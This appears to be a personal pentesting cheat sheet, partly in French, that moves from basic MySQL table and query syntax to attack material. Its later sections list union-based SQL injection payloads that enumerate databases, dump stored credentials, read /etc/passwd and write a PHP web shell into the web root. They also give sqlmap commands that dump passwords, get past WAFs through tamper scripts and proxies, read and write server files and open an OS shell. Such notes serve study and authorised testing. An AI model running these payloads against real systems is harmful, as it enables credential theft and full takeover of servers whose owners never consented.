# MySQL

## Base

```sql
CREATE DATABASE users;
SHOW DATABASES;

CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
);

SHOW TABLES;
DESCRIBE logins;

CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
);
```

### Insert

```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

### Select

```sql
SELECT * FROM logins;
SELECT username, password FROM logins;
```

### Alter

```sql
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
ALTER TABLE logins MODIFY oldColumn DATE;
```

### Update

```sql
UPDATE logins SET password = 'change_password' WHERE id > 1;
```

### Order

```sql
SELECT * FROM logins ORDER BY password;
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;
```

### Limit

```sql
SELECT * FROM logins LIMIT 2;
SELECT * FROM logins LIMIT 1, 2;
```

### Where

```sql
SELECT * FROM logins WHERE id > 1;
SELECT * FROM logins WHERE username = 'admin';
```

### Like

```sql
SELECT * FROM logins WHERE username LIKE 'admin%';
SELECT * FROM logins WHERE username LIKE '___';
```

### And - Or - Not

```sql
SELECT * FROM logins WHERE username != 'john';
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```

# Union-Based SQL Injection

```sql
' ORDER BY 2 -- -
-- Tester jusqu'à l'erreur

' UNION SELECT 1,2,3,4-- -
' UNION SELECT 1,@@version,3,4-- -
' UNION SELECT 1,user(),3,4-- -
' UNION SELECT 1,database(),2,3-- -
' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

# SQLMap

### Basique

```bash
sqlmap -r req.txt
sqlmap -u www.target.com --data='id=1' --method PUT
sqlmap -u www.target.com --data='id=1' --dump --batch -t /tmp/traffic.txt
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch --proxy
sqlmap -u www.example.com/?id=1 --level=5 --risk=3
```

### Enumération

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
sqlmap -u "http://www.example.com/?id=1" --schema
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

### Contournement

```bash
--csrf-token="csrf-token"
--randomize=rp
--proxy="socks4://177.39.187.70:33283"
--skip-waf
--random-agent
--tamper
```

### Lire/Écrire des fichiers

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
sqlmap -u "http://www.example.com/?id=1" --os-shell
